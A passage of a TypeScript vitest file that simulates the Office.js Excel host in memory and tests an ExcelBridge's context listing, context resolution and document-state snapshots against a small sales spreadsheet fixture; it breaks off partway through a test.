import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  asChangeId,
  DocStateSnapshotSchema,
  ResolvedContextSchema,
  type ActuationRequest,
  type ContextRef,
  type ProvenancePayload,
} from '@ge/contracts';
import type { HostEvent } from '@ge/triggers';
import { ExcelBridge } from './excel-bridge.js';

/**
 * Self-contained, in-memory **Excel host simulator** for the bridge-excel package. It models ONLY
 * the slice of the Office.js object model {@link ExcelBridge} drives (mirroring the enumerated call
 * set in the web-shell harness, but kept local so this package adds no cross-package dependency).
 *
 * Reads honour the load/sync contract: a `Range` property must be named in `load()` AND resolved by
 * `context.sync()` before it can be read — reading an unloaded property throws, exactly like the
 * real host. Writes (`.values` / `.formulas` / `.format` / `comments.add`) record into the seed at
 * `sync()`, so a test can assert the reversible, provenanced effect actually landed.
 */

/* ───────────────────────────── seed shapes ─────────────────────────────── */

interface SheetSeed {
  name: string;
  /** Top-left A1 cell of `values`. */
  origin: string;
  values: string[][];
}
interface NamedRangeSeed {
  name: string;
  /** Sheet-qualified A1 (no `=`), e.g. `"Sales!A1:D7"`. */
  range: string;
}
interface CommentSeed {
  id: string;
  cell: string;
  content: string;
  replies: string[];
  resolved: boolean;
}
/** A native Table the bridge minted via `tables.add`, keyed on the host-minted name. */
interface TableSeed {
  name: string;
  sheet: string;
  address: string;
  hasHeaders: boolean;
}
/** A chart the bridge minted via `charts.add`, keyed on the host-minted name. */
interface ChartSeed {
  name: string;
  sheet: string;
  chartType: string;
  seriesBy: string;
  sourceAddress: string;
  title?: string;
}
/** One conditional-format rule appended to a range's CF collection. */
interface CfSeed {
  address: string;
  cfType: string;
  cellValue?: { operator: string; formula1: string; formula2?: string; fill?: string };
  top?: { rank: number; type: string; fill?: string };
}
interface ExcelSeed {
  sheets: SheetSeed[];
  activeSheet: string;
  selection: string;
  namedRanges: NamedRangeSeed[];
  comments: CommentSeed[];
  formats: Map<string, Record<string, unknown>>;
  /** Tables minted via `tables.add`, in mint order (the minted name is the inverse identity). */
  tables: TableSeed[];
  /** Charts minted via `charts.add`, in mint order. */
  charts: ChartSeed[];
  /** Conditional-format rules per range address (ordinal = index within the array). */
  conditionalFormats: Map<string, CfSeed[]>;
  /** Monotonic counters so each mint gets a deterministic host-assigned name. */
  tableCounter: number;
  chartCounter: number;
}

function seedOf(init: Partial<ExcelSeed> & { sheets: SheetSeed[] }): ExcelSeed {
  const first = init.sheets[0];
  if (!first) throw new Error('seedOf needs a sheet');
  const active = init.activeSheet ?? first.name;
  return {
    sheets: init.sheets,
    activeSheet: active,
    selection: init.selection ?? `${active}!${first.origin}`,
    namedRanges: init.namedRanges ?? [],
    comments: init.comments ?? [],
    formats: init.formats ?? new Map(),
    tables: init.tables ?? [],
    charts: init.charts ?? [],
    conditionalFormats: init.conditionalFormats ?? new Map(),
    tableCounter: init.tableCounter ?? 0,
    chartCounter: init.chartCounter ?? 0,
  };
}

/* ───────────────────────────── A1 helpers ──────────────────────────────── */

function colToIndex(col: string): number {
  let n = 0;
  for (const ch of col.toUpperCase()) n = n * 26 + (ch.charCodeAt(0) - 64);
  return n - 1;
}
function indexToCol(index: number): string {
  let s = '';
  let n = index + 1;
  while (n > 0) {
    const rem = (n - 1) % 26;
    s = String.fromCharCode(65 + rem) + s;
    n = Math.floor((n - 1) / 26);
  }
  return s;
}
interface Span {
  startRow: number;
  startCol: number;
  rows: number;
  cols: number;
}
function parseA1(a1: string): Span {
  const clean = a1.replace(/\$/g, '');
  const [a, b] = clean.split(':');
  const cell = (ref: string): { row: number; col: number } => {
    const m = /^([A-Za-z]+)(\d+)$/.exec(ref.trim());
    if (!m) throw new Error(`bad A1: ${ref}`);
    return { col: colToIndex(m[1] as string), row: parseInt(m[2] as string, 10) - 1 };
  };
  const start = cell(a as string);
  const end = b ? cell(b) : start;
  return {
    startRow: Math.min(start.row, end.row),
    startCol: Math.min(start.col, end.col),
    rows: Math.abs(end.row - start.row) + 1,
    cols: Math.abs(end.col - start.col) + 1,
  };
}
function usedA1(sheet: SheetSeed): string {
  const o = parseA1(sheet.origin);
  const rows = sheet.values.length;
  const cols = Math.max(0, ...sheet.values.map((r) => r.length));
  const tl = `${indexToCol(o.startCol)}${o.startRow + 1}`;
  const br = `${indexToCol(o.startCol + cols - 1)}${o.startRow + rows}`;
  return `${tl}:${br}`;
}

/* ───────────────────────────── fake range ──────────────────────────────── */

class FakeRange {
  getSpecialCellsOrNullObject() {
    const span = parseA1(this.a1);
    const items: Array<{ address: string }> = [];
    for (let r = 0; r < span.rows; r++)
      for (let c = 0; c < span.cols; c++)
        if (
          (this.pendingFormulas?.[r]?.[c] ||
            (this.pendingValues?.[r]?.[c] === undefined ? this.formulas[r]?.[c] : '')) &&
          String(this.formulas[r]?.[c]).startsWith('=')
        )
          items.push({
            address: `${this.sheetName}!${indexToCol(span.startCol + c)}${span.startRow + r + 1}`,
          });
    return { isNullObject: items.length === 0, load() {}, areas: { items, load() {} } };
  }

  get worksheet(): FakeWorksheet {
    return new FakeWorksheet(this.seed, this.sheetName);
  }
  private loaded = new Set<string>();
  private requested = new Set<string>();
  private pendingValues?: string[][];
  private pendingFormulas?: unknown[][];
  get formulas(): unknown[][] {
    return this.pendingFormulas ?? this.values;
  }
  set formulas(value: unknown[][]) {
    this.pendingFormulas = value;
  }
  numberFormat: unknown[][] = [];
  readonly format = {
    font: { bold: undefined as boolean | undefined, italic: undefined as boolean | undefined },
    fill: { color: undefined as string | undefined },
  };

  constructor(
    private readonly seed: ExcelSeed,
    private readonly sheetName: string,
    private readonly a1: string,
    private readonly nullObject = false,
    /** When true, `load()` marks props loaded immediately — for ranges the context doesn't track. */
    private readonly autoFlush = false,
  ) {}

  private require(prop: string): void {
    if (!this.loaded.has(prop)) throw new Error(`fake-excel: "${prop}" not loaded before sync`);
  }
  get isNullObject(): boolean {
    this.require('isNullObject');
    return this.nullObject;
  }
  get address(): string {
    this.require('address');
    return `${this.sheetName}!${this.a1}`;
  }
  get rowCount(): number {
    this.require('rowCount');
    return parseA1(this.a1).rows;
  }
  get columnCount(): number {
    this.require('columnCount');
    return parseA1(this.a1).cols;
  }
  get values(): string[][] {
    this.require('values');
    if (this.pendingValues) return this.pendingValues;
    const sheet = this.seed.sheets.find((s) => s.name === this.sheetName);
    if (!sheet) return [];
    const span = parseA1(this.a1);
    const o = parseA1(sheet.origin);
    const out: string[][] = [];
    for (let r = 0; r < span.rows; r++) {
      const row: string[] = [];
      for (let c = 0; c < span.cols; c++) {
        const sr = span.startRow - o.startRow + r;
        const sc = span.startCol - o.startCol + c;
        row.push(String(sheet.values[sr]?.[sc] ?? ''));
      }
      out.push(row);
    }
    return out;
  }
  set values(grid: unknown[][]) {
    this.pendingValues = grid.map((row) =>
      row.map((v) => (typeof v === 'string' && v.startsWith("'") ? v.slice(1) : v)),
    ) as string[][];
  }

  load(props?: string): this {
    const all = ['address', 'values', 'rowCount', 'columnCount', 'isNullObject'];
    const names = props && props.trim() ? props.split(',') : all;
    for (const raw of names) {
      const name = raw.trim().split('/')[0]?.trim();
      if (name) this.requested.add(name);
    }
    if (this.autoFlush) this.flushLoads();
    return this;
  }
  flushLoads(): void {
    for (const p of this.requested) this.loaded.add(p);
    this.requested.clear();
  }
  getCell(rowOffset: number, colOffset: number): FakeRange {
    const span = parseA1(this.a1);
    const a1 = `${indexToCol(span.startCol + colOffset)}${span.startRow + rowOffset + 1}`;
    return new FakeRange(this.seed, this.sheetName, a1);
  }
  get conditionalFormats(): FakeConditionalFormatCollection {
    return new FakeConditionalFormatCollection(this.seed, `${this.sheetName}!${this.a1}`);
  }
  select(): void {
    this.seed.activeSheet = this.sheetName;
    this.seed.selection = `${this.sheetName}!${this.a1}`;
  }
  commit(): void {
    if (this.nullObject) return;
    // format facets (write-only) → seed.formats keyed by address.
    const nf = this.numberFormat[0]?.[0];
    const facets: Record<string, unknown> = {
      ...(this.format.font.bold !== undefined ? { bold: this.format.font.bold } : {}),
      ...(this.format.font.italic !== undefined ? { italic: this.format.font.italic } : {}),
      ...(this.format.fill.color !== undefined ? { fill: this.format.fill.color } : {}),
      ...(nf !== undefined ? { numberFormat: String(nf) } : {}),
    };
    if (Object.keys(facets).length > 0) {
      const addr = `${this.sheetName}!${this.a1}`;
      this.seed.formats.set(addr, { ...(this.seed.formats.get(addr) ?? {}), ...facets });
    }
    // values / formulas → seed grid.
    const sheet = this.seed.sheets.find((s) => s.name === this.sheetName);
    if (!sheet) return;
    const span = parseA1(this.a1);
    const o = parseA1(sheet.origin);
    for (let r = 0; r < span.rows; r++) {
      for (let c = 0; c < span.cols; c++) {
        const formula = this.pendingFormulas?.[r]?.[c];
        const value = this.pendingValues?.[r]?.[c];
        const written =
          formula !== undefined && formula !== null && formula !== ''
            ? String(formula)
            : value !== undefined
              ? String(value)
              : undefined;
        if (written === undefined) continue;
        const sr = span.startRow - o.startRow + r;
        const sc = span.startCol - o.startCol + c;
        if (sr < 0 || sc < 0) continue;
        while (sheet.values.length <= sr) sheet.values.push([]);
        const row = sheet.values[sr] as string[];
        while (row.length <= sc) row.push('');
        row[sc] = written;
      }
    }
  }
}

/* ─────────────────── fake tables / charts / conditional ─────────────────── */

/** Models the slice of `Excel.Table` the bridge loads: a host-MINTED `name` + `getRange`. */
class FakeTable {
  constructor(
    private readonly seed: ExcelSeed,
    private readonly target: TableSeed,
  ) {}
  private loaded = false;
  load(props?: string): this {
    if (!props || props.includes('name')) this.loaded = true;
    return this;
  }
  get name(): string {
    if (!this.loaded) throw new Error('fake-excel: table "name" not loaded before sync');
    return this.target.name;
  }
  getRange(): FakeRange {
    // Not registered with the context's range tracker → auto-flush so the bridge can read
    // `getRange().address` after its sync (mirrors how Office resolves a derived range).
    return new FakeRange(
      this.seed,
      this.target.sheet,
      this.target.address.replace(/\$/g, ''),
      false,
      true,
    );
  }
}

class FakeTableCollection {
  constructor(
    private readonly seed: ExcelSeed,
    private readonly sheetName?: string,
  ) {}
  added: Array<{ address: string; hasHeaders: boolean }> = [];
  items: FakeTable[] = [];
  load(): this {
    this.items = this.seed.tables
      .filter((t) => this.sheetName === undefined || t.sheet === this.sheetName)
      .map((t) => {
        const table = new FakeTable(this.seed, t);
        table.load('name');
        return table;
      });
    return this;
  }
  add(address: string, hasHeaders: boolean): FakeTable {
    this.added.push({ address, hasHeaders });
    // The host assigns the name — NOT the caller. Mirror that: a deterministic minted name the
    // bridge must read back. (`Table1`, `Table2`, …)
    const name = `Table${++this.seed.tableCounter}`;
    const bang = address.lastIndexOf('!');
    const sheet = bang >= 0 ? address.slice(0, bang) : (this.sheetName ?? this.seed.activeSheet);
    const a1 = bang >= 0 ? address.slice(bang + 1) : address;
    const target: TableSeed = { name, sheet, address: a1, hasHeaders };
    this.seed.tables.push(target);
    return new FakeTable(this.seed, target);
  }
}

class FakeChartTitle {
  constructor(private readonly target: ChartSeed) {}
  set text(v: string) {
    this.target.title = v;
  }
}
class FakeChart {
  constructor(private readonly target: ChartSeed) {}
  private loaded = false;
  get title(): FakeChartTitle {
    return new FakeChartTitle(this.target);
  }
  load(props?: string): this {
    if (!props || props.includes('name')) this.loaded = true;
    return this;
  }
  get name(): string {
    if (!this.loaded) throw new Error('fake-excel: chart "name" not loaded before sync');
    return this.target.name;
  }
}

class FakeChartCollection {
  constructor(
    private readonly seed: ExcelSeed,
    private readonly sheetName: string,
  ) {}
  added: Array<{ chartType: string; sourceAddress: string; seriesBy: string }> = [];
  add(chartType: string, sourceData: FakeRange, seriesBy: string): FakeChart {
    sourceData.load('address');
    sourceData.flushLoads();
    const sourceAddress = sourceData.address;
    this.added.push({ chartType, sourceAddress, seriesBy });
    const name = `Chart ${++this.seed.chartCounter}`;
    const target: ChartSeed = { name, sheet: this.sheetName, chartType, seriesBy, sourceAddress };
    this.seed.charts.push(target);
    return new FakeChart(target);
  }
}

/** Minimal `ClientResult<number>` — `.value` resolves after sync (snapshotted at call time here). */
class FakeClientResult {
  constructor(readonly value: number) {}
}

class FakeConditionalRangeFill {
  constructor(private readonly onColor: (c: string) => void) {}
  private _color = '';
  get color(): string {
    return this._color;
  }
  set color(v: string) {
    this._color = v;
    this.onColor(v);
  }
}
class FakeConditionalRangeFormat {
  constructor(private readonly onFill: (c: string) => void) {}
  get fill(): FakeConditionalRangeFill {
    return new FakeConditionalRangeFill(this.onFill);
  }
}
class FakeCellValueConditionalFormat {
  constructor(private readonly seed: CfSeed) {}
  set rule(r: { formula1: string; formula2?: string; operator: string }) {
    this.seed.cellValue = {
      operator: r.operator,
      formula1: r.formula1,
      ...(r.formula2 !== undefined ? { formula2: r.formula2 } : {}),
      ...(this.seed.cellValue?.fill !== undefined ? { fill: this.seed.cellValue.fill } : {}),
    };
  }
  get format(): FakeConditionalRangeFormat {
    return new FakeConditionalRangeFormat((color) => {
      this.seed.cellValue = {
        operator: '',
        formula1: '',
        ...(this.seed.cellValue ?? {}),
        fill: color,
      };
    });
  }
}
class FakeTopBottomConditionalFormat {
  constructor(private readonly seed: CfSeed) {}
  set rule(r: { rank: number; type: string }) {
    this.seed.top = {
      rank: r.rank,
      type: r.type,
      ...(this.seed.top?.fill !== undefined ? { fill: this.seed.top.fill } : {}),
    };
  }
  get format(): FakeConditionalRangeFormat {
    return new FakeConditionalRangeFormat((color) => {
      this.seed.top = { rank: 0, type: '', ...(this.seed.top ?? {}), fill: color };
    });
  }
}
class FakeConditionalFormat {
  constructor(private readonly seed: CfSeed) {}
  get cellValue(): FakeCellValueConditionalFormat {
    return new FakeCellValueConditionalFormat(this.seed);
  }
  get topBottom(): FakeTopBottomConditionalFormat {
    return new FakeTopBottomConditionalFormat(this.seed);
  }
}

class FakeConditionalFormatCollection {
  constructor(
    private readonly seed: ExcelSeed,
    private readonly address: string,
  ) {}
  private list(): CfSeed[] {
    let arr = this.seed.conditionalFormats.get(this.address);
    if (!arr) {
      arr = [];
      this.seed.conditionalFormats.set(this.address, arr);
    }
    return arr;
  }
  getCount(): FakeClientResult {
    return new FakeClientResult(this.list().length);
  }
  add(type: string): FakeConditionalFormat {
    const rule: CfSeed = { address: this.address, cfType: type };
    this.list().push(rule);
    return new FakeConditionalFormat(rule);
  }
}

class FakeNamedItem {
  constructor(
    private readonly seed: ExcelSeed,
    readonly name: string,
    readonly type: string,
    readonly formula: string,
    private readonly nullObject = false,
  ) {}
  load(): this {
    return this;
  }
  getRange(): FakeRange {
    if (this.nullObject) return new FakeRange(this.seed, this.seed.activeSheet, 'A1', true);
    const ref = this.formula.replace(/^=/, '');
    const bang = ref.lastIndexOf('!');
    const sheetName = bang >= 0 ? ref.slice(0, bang) : this.seed.activeSheet;
    const a1 = bang >= 0 ? ref.slice(bang + 1) : ref;
    return new FakeRange(this.seed, sheetName, a1.replace(/\$/g, ''));
  }
}

class FakeWorksheet {
  get id(): string {
    return `sheet:${this.name}`;
  }
  constructor(
    private readonly seed: ExcelSeed,
    readonly name: string,
  ) {}
  load(): this {
    return this;
  }
  get tables(): FakeTableCollection {
    return new FakeTableCollection(this.seed, this.name);
  }
  get charts(): FakeChartCollection {
    return new FakeChartCollection(this.seed, this.name);
  }
  getUsedRange(): FakeRange {
    const sheet = byName(this.seed, this.name);
    return new FakeRange(this.seed, this.name, usedA1(sheet));
  }
  getUsedRangeOrNullObject(): FakeRange {
    const sheet = byName(this.seed, this.name);
    const empty = sheet.values.every((row) => row.every((c) => String(c ?? '').trim() === ''));
    if (empty) return new FakeRange(this.seed, this.name, 'A1', true);
    return new FakeRange(this.seed, this.name, usedA1(sheet));
  }
  getRange(a1: string): FakeRange {
    return new FakeRange(this.seed, this.name, a1.replace(/\$/g, ''));
  }
  activate(): void {
    this.seed.activeSheet = this.name;
  }
}

interface Handle {
  remove(): void;
}
class EventSink<A> {
  readonly handlers: Array<(a: A) => unknown> = [];
  /** When set, `.add()` throws — simulates an event missing from the active requirement set. */
  throwOnAdd = false;
  add(h: (a: A) => unknown): Handle {
    if (this.throwOnAdd) throw new Error('event not in requirement set');
    this.handlers.push(h);
    return {
      remove: () => {
        const i = this.handlers.indexOf(h);
        if (i >= 0) this.handlers.splice(i, 1);
      },
    };
  }
  fire(a: A): void {
    for (const h of [...this.handlers]) void h(a);
  }
}

class FakeWorksheetCollection {
  readonly onChanged = new EventSink<{ source?: string }>();
  readonly onSelectionChanged = new EventSink<{ address: string }>();
  constructor(private readonly seed: ExcelSeed) {}
  getActiveWorksheet(): FakeWorksheet {
    return new FakeWorksheet(this.seed, this.seed.activeSheet);
  }
  getItem(name: string): FakeWorksheet {
    byName(this.seed, name);
    return new FakeWorksheet(this.seed, name);
  }
}

class FakeNamedItemCollection {
  items: FakeNamedItem[] = [];
  constructor(private readonly seed: ExcelSeed) {}
  load(): this {
    this.items = this.seed.namedRanges.map(
      (n) => new FakeNamedItem(this.seed, n.name, 'Range', `=${n.range}`),
    );
    return this;
  }
  getItemOrNullObject(name: string): FakeNamedItem {
    const found = this.seed.namedRanges.find((n) => n.name === name);
    if (!found) return new FakeNamedItem(this.seed, name, 'Range', '', true);
    return new FakeNamedItem(this.seed, found.name, 'Range', `=${found.range}`);
  }
}

class FakeReplies {
  constructor(private readonly target: CommentSeed) {}
  add(text: string): void {
    this.target.replies.push(text);
  }
}
class FakeComment {
  constructor(private readonly target: CommentSeed) {}
  get id(): string {
    return this.target.id;
  }
  get replies(): FakeReplies {
    return new FakeReplies(this.target);
  }
  set resolved(v: boolean) {
    this.target.resolved = v;
  }
}
class FakeCommentCollection {
  items: FakeComment[] = [];
  readonly onAdded = new EventSink<{
    source?: string;
    commentDetails: Array<{ commentId: string }>;
  }>();
  added: Array<{ cell: string; content: string }> = [];
  /** When true, `.add()` throws — simulates a host that can't attach the citation comment. */
  throwOnAdd = false;
  private next = 1;
  constructor(private readonly seed: ExcelSeed) {}
  load(): this {
    this.items = this.seed.comments.map((c) => new FakeComment(c));
    return this;
  }
  add(cell: string, content: string): void {
    if (this.throwOnAdd) throw new Error('comments unsupported');
    this.added.push({ cell, content });
    this.seed.comments.push({
      id: `sim-${this.next++}`,
      cell,
      content,
      replies: [],
      resolved: false,
    });
  }
}

class FakeWorkbook {
  readonly worksheets: FakeWorksheetCollection;
  readonly names: FakeNamedItemCollection;
  readonly tables: FakeTableCollection;
  readonly comments: FakeCommentCollection;
  constructor(private readonly seed: ExcelSeed) {
    this.worksheets = new FakeWorksheetCollection(seed);
    this.names = new FakeNamedItemCollection(seed);
    this.tables = new FakeTableCollection(seed);
    this.comments = new FakeCommentCollection(seed);
  }
  getSelectedRange(): FakeRange {
    const bang = this.seed.selection.lastIndexOf('!');
    const sheetName = bang >= 0 ? this.seed.selection.slice(0, bang) : this.seed.activeSheet;
    const a1 = bang >= 0 ? this.seed.selection.slice(bang + 1) : this.seed.selection;
    return new FakeRange(this.seed, sheetName, a1.replace(/\$/g, ''));
  }
}

class FakeContext {
  readonly workbook: FakeWorkbook;
  private readonly touched: FakeRange[] = [];
  constructor(seed: ExcelSeed) {
    this.workbook = trackRanges(new FakeWorkbook(seed), this.touched);
  }
  sync(): Promise<void> {
    for (const r of this.touched) r.flushLoads();
    for (const r of this.touched) r.commit();
    return Promise.resolve();
  }
}

function trackRanges(workbook: FakeWorkbook, touched: FakeRange[]): FakeWorkbook {
  const reg = (r: FakeRange): FakeRange => {
    touched.push(r);
    const gc = r.getCell.bind(r);
    r.getCell = (a: number, b: number) => {
      const cell = gc(a, b);
      touched.push(cell);
      return cell;
    };
    return r;
  };
  const origSel = workbook.getSelectedRange.bind(workbook);
  workbook.getSelectedRange = () => reg(origSel());
  const wrapSheet = (s: FakeWorksheet): FakeWorksheet => {
    const gr = s.getRange.bind(s);
    s.getRange = (a1: string) => reg(gr(a1));
    const gu = s.getUsedRange.bind(s);
    s.getUsedRange = () => reg(gu());
    const gun = s.getUsedRangeOrNullObject.bind(s);
    s.getUsedRangeOrNullObject = () => reg(gun());
    return s;
  };
  const gi = workbook.worksheets.getItem.bind(workbook.worksheets);
  const ga = workbook.worksheets.getActiveWorksheet.bind(workbook.worksheets);
  workbook.worksheets.getItem = (n: string) => wrapSheet(gi(n));
  workbook.worksheets.getActiveWorksheet = () => wrapSheet(ga());
  const gn = workbook.names.getItemOrNullObject.bind(workbook.names);
  workbook.names.getItemOrNullObject = (n: string): FakeNamedItem => {
    const item = gn(n);
    const grr = item.getRange.bind(item);
    (item as { getRange: () => FakeRange }).getRange = () => reg(grr());
    return item;
  };
  return workbook;
}

function byName(seed: ExcelSeed, name: string): SheetSeed {
  const s = seed.sheets.find((x) => x.name === name);
  if (!s) throw new Error(`no sheet "${name}"`);
  return s;
}

/* ───────────────────────────── install ─────────────────────────────────── */

interface SettingsRecorder {
  store: Map<string, unknown>;
  saveStatus: string;
  /** When true, saveAsync invokes its callback with a failed status. */
  saveFails: boolean;
  /** When true, saveAsync itself throws synchronously (host bridge quirk). */
  saveThrows: boolean;
  /** When true, calling set() throws. */
  setThrows: boolean;
  saveCalls: number;
}

interface Installed {
  seed: ExcelSeed;
  workbook(): FakeWorkbook | undefined;
  settings: SettingsRecorder;
  restore(): void;
}

/**
 * Install fakes onto `globalThis.Excel` and `globalThis.Office`. `apiVersion` is the highest
 * supported ExcelApi minor (e.g. `13` ⇒ `1.13`), so the bridge's `isSet('ExcelApi','1.x')` gates
 * resolve against it. `withSettings:false` drops the document settings bag (older host) so the
 * provenance-drop path is exercised.
 */
function installExcel(
  seed: ExcelSeed,
  opts: { apiVersion?: number; withSettings?: boolean } = {},
): Installed {
  const apiVersion = opts.apiVersion ?? 13;
  let lastWorkbook: FakeWorkbook | undefined;
  const excel = {
    run: async <T>(cb: (ctx: FakeContext) => Promise<T>): Promise<T> => {
      const ctx = new FakeContext(seed);
      lastWorkbook = ctx.workbook;
      return cb(ctx);
    },
  };

  const settings: SettingsRecorder = {
    store: new Map(),
    saveStatus: 'succeeded',
    saveFails: false,
    saveThrows: false,
    setThrows: false,
    saveCalls: 0,
  };
  const settingsBag = {
    set(name: string, value: unknown): void {
      if (settings.setThrows) throw new Error('settings.set blew up');
      settings.store.set(name, value);
    },
    saveAsync(cb?: (r: unknown) => void): void {
      settings.saveCalls += 1;
      if (settings.saveThrows) throw new Error('saveAsync blew up');
      const status = settings.saveFails ? 'failed' : settings.saveStatus;
      cb?.({ status });
    },
  };

  const office = {
    context: {
      requirements: {
        isSetSupported(name: string, version?: string): boolean {
          if (name !== 'ExcelApi' || !version) return false;
          const minor = parseFloat(version.split('.')[1] ?? '0');
          return minor <= apiVersion;
        },
      },
      ...(opts.withSettings === false ? {} : { document: { settings: settingsBag } }),
    },
  };

  const g = globalThis as unknown as Record<string, unknown>;
  const prevExcel = g.Excel;
  const prevOffice = g.Office;
  g.Excel = excel;
  g.Office = office;

  return {
    seed,
    workbook: () => lastWorkbook,
    settings,
    restore() {
      g.Excel = prevExcel;
      g.Office = prevOffice;
    },
  };
}

/* ───────────────────────────── fixtures ────────────────────────────────── */

function salesSeed(): ExcelSeed {
  return seedOf({
    sheets: [
      {
        name: 'Sales',
        origin: 'A1',
        values: [
          ['region', 'rep', 'revenue'],
          ['East', 'Alice', '300'],
          ['West', 'Carol', '180'],
          ['North', 'Erin', '140'],
        ],
      },
      { name: 'Empty', origin: 'A1', values: [['']] },
    ],
    activeSheet: 'Sales',
    selection: 'Sales!A2:C2',
    namedRanges: [{ name: 'SalesTable', range: 'Sales!A1:C4' }],
  });
}

const PROVENANCE: ProvenancePayload = {
  agentId: 'review@v1',
  identity: 'v.k@acme',
  timestamp: '2026-06-22T00:00:00Z',
  contentHash: 'sha256:abc',
  sources: [{ title: 'SLA Policy', uri: 'https://acme/sla' }],
};

function writeCells(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
  return { changeId: asChangeId(id), kind: 'write-cells', surface: 'excel', params };
}
function formatCells(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
  return { changeId: asChangeId(id), kind: 'format-cells', surface: 'excel', params };
}
function createTable(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
  return { changeId: asChangeId(id), kind: 'create-table', surface: 'excel', params };
}
function insertChart(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
  return { changeId: asChangeId(id), kind: 'insert-chart', surface: 'excel', params };
}
function formatConditional(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
  return { changeId: asChangeId(id), kind: 'format-conditional', surface: 'excel', params };
}
function addComment(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
  return { changeId: asChangeId(id), kind: 'add-comment', surface: 'excel', params };
}
function commentReply(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
  return { changeId: asChangeId(id), kind: 'comment-reply', surface: 'excel', params };
}

type FakeRun = <T>(cb: (ctx: FakeContext) => Promise<T>) => Promise<T>;

/**
 * Replace the installed `Excel.run` with one that runs a `mutate` hook on each fresh context before
 * the bridge's callback — used to inject a fault (a comment/event `.add()` that throws) mid-run.
 * The `globalThis.Excel` global is typed as the real `@types/office-js` namespace, so the swap is
 * routed through a single `unknown` cast (the boundary cast the harness isolates).
 */
function patchRun(mutate: (ctx: FakeContext) => void): void {
  const g = globalThis as unknown as { Excel: { run: FakeRun } };
  const orig = g.Excel.run;
  g.Excel.run = (cb) =>
    orig((ctx) => {
      mutate(ctx);
      return cb(ctx);
    });
}

let active: Installed | undefined;
afterEach(() => {
  active?.restore();
  active = undefined;
});

/* ───────────────────────────── tests ───────────────────────────────────── */

describe('ExcelBridge.listContext (host wiring)', () => {
  it('lists the live selection and the used-range sheet, previewing both', async () => {
    active = installExcel(salesSeed());
    const refs = await new ExcelBridge().listContext();
    expect(refs).toHaveLength(3);
    expect(refs[0]).toMatchObject({ kind: 'range', surface: 'excel', live: true });
    expect(refs[0]?.id).toBe('xl:Sales!A2:C2');
    expect(refs[0]?.preview).toContain('East'); // selection A2:C2 = East,Alice,300
    expect(refs[1]).toMatchObject({
      id: 'xl:named:SalesTable',
      kind: 'range',
      surface: 'excel',
      title: 'SalesTable',
      preview: 'Sales!A1:C4',
      hostRef: { type: 'excel.namedRange', name: 'SalesTable' },
    });
    expect(refs[2]).toMatchObject({ kind: 'sheet', surface: 'excel' });
    expect(refs[2]?.id).toBe('xl:Sales!A1:C4');
    expect(refs[2]?.live).toBeUndefined();
  });

  it('lists workbook tables as openable table refs', async () => {
    const seed = salesSeed();
    seed.tables.push({ name: 'RevenueTable', sheet: 'Sales', address: 'A1:C4', hasHeaders: true });
    active = installExcel(seed);
    const refs = await new ExcelBridge().listContext();
    const table = refs.find((r) => r.id === 'xl:table:RevenueTable');
    expect(table).toMatchObject({
      kind: 'table',
      surface: 'excel',
      title: 'RevenueTable',
      preview: 'Sales!A1:C4 · 4 × 3',
      hostRef: { type: 'excel.table', name: 'RevenueTable', worksheet: 'Sales' },
    });
    expect(table?.anchor?.locator).toBe('range:Sales!A1:C4');
  });

  it('includes a blank selection chip so generated artifacts have an insertion anchor', async () => {
    const seed = salesSeed();
    seed.selection = 'Empty!A1';
    seed.activeSheet = 'Empty';
    active = installExcel(seed);
    const refs = await new ExcelBridge().listContext();
    expect(refs[0]).toMatchObject({
      id: 'xl:Empty!A1',
      kind: 'range',
      live: true,
      preview: 'Blank selection',
    });
    expect(refs.map((r) => r.kind)).toEqual(['range', 'range', 'sheet']);
  });
});

describe('ExcelBridge.resolveContext (host wiring)', () => {
  it('resolves a range ref from the live selection as anchored table context', async () => {
    active = installExcel(salesSeed());
    const ref: ContextRef = {
      id: 'xl:Sales!A1:C4',
      kind: 'range',
      surface: 'excel',
      title: 'Sales!A1:C4',
    };
    const ctx = await new ExcelBridge().resolveContext(ref);
    expect(ctx.length).toBeGreaterThan(0);
    for (const c of ctx) expect(() => ResolvedContextSchema.parse(c)).not.toThrow();
    expect(ctx.some((c) => c.ref.anchor?.locator === 'range:Sales!A1:C4')).toBe(true);
  });

  it('resolves a named-range ref by its stable host ref rather than current selection', async () => {
    active = installExcel(salesSeed());
    active.seed.selection = 'Sales!A2:C2';
    const ref: ContextRef = {
      id: 'xl:named:SalesTable',
      kind: 'range',
      surface: 'excel',
      title: 'SalesTable',
      hostRef: { type: 'excel.namedRange', name: 'SalesTable' },
    };
    const ctx = await new ExcelBridge().resolveContext(ref);
    expect(ctx.some((c) => c.ref.anchor?.locator === 'range:Sales!A1:C4')).toBe(true);
  });

  it('resolves a table ref through its range anchor', async () => {
    const seed = salesSeed();
    seed.tables.push({ name: 'RevenueTable', sheet: 'Sales', address: 'A1:C4', hasHeaders: true });
    active = installExcel(seed);
    const ref: ContextRef = {
      id: 'xl:table:RevenueTable',
      kind: 'table',
      surface: 'excel',
      title: 'RevenueTable',
      anchor: { matchText: 'Sales!A1:C4', locator: 'range:Sales!A1:C4' },
      hostRef: { type: 'excel.table', name: 'RevenueTable', worksheet: 'Sales' },
    };
    const ctx = await new ExcelBridge().resolveContext(ref);
    expect(ctx.some((c) => c.ref.anchor?.locator === 'range:Sales!A1:C4')).toBe(true);
  });

  it('resolves a sheet ref from the active sheet used range', async () => {
    active = installExcel(salesSeed());
    const ref: ContextRef = {
      id: 'xl:Sales!A1:C4',
      kind: 'sheet',
      surface: 'excel',
      title: 'Sales',
    };
    const ctx = await new ExcelBridge().resolveContext(ref);
    expect(ctx.some((c) => c.ref.anchor?.locator === 'range:Sales!A1:C4')).toBe(true);
  });
});

describe('ExcelBridge.captureDocState (ADR-0003 outline)', () => {
  it('snapshots the used range, selection, and named ranges; bumps version each capture', async () => {
    active = installExcel(salesSeed());
    const bridge = new ExcelBridge();
    const first = await bridge.captureDocState();
    expect(first).toBeDefined();
    if (!first) return;
    expect(() => DocStateSnapshotSchema.parse(first)).not.toThrow();
    expect(first.surface).toBe('excel');
    expect(first.version).toBe(1);
    expect(first.title).toBe('Sales');
